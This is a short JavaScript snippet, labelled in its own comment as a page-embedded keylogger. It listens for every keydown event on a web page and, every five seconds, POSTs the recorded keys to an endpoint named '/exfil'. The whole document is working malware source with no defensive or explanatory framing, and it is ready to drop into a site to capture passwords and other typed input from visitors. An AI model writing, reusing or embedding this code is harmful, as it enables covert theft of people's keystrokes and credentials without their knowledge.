// A page-embedded keylogger: key values queued from a keyboard listener.
const log = [];
document.addEventListener("keydown", (e) => {
  log.push({ key: e.key });
});
setInterval(() => {
  fetch("/exfil", { method: "POST", body: JSON.stringify(log) });
}, 5000);
